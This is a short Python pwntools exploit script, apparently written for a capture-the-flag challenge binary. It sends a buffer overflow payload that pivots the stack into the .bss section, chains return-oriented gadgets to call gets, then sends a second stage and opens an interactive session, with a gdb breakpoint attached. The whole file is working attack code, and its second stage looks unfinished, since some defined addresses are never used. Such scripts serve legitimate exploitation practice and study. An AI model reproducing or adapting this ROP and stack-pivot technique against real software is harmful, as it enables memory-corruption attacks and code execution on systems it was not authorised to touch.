from pwn import *
import sys

elf = ELF("share/chall")
libc = ELF("libs/libc.so.6")

io = process(elf.path)
# io = remote()

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io, "b *0x401246")

pop_rdi_ret = 0x40116a
leave_ret = 0x401219
stack_pivot_addr = elf.bss() + 0xef8
_IO_2_1_stdin_addr = 0x404e58
add_rbp0x3d_addr = 0x40114c

payload = b"A" * 32
payload += p64(stack_pivot_addr)
payload += p64(pop_rdi_ret)
payload += p64(stack_pivot_addr)
payload += p64(elf.plt["gets"])
payload += p64(leave_ret)

io.sendline(payload)

payload = p64(add_rbp0x3d_addr + 0x3d)
payload += p64(elf.plt["gets"])


io.sendline(payload)

io.interactive()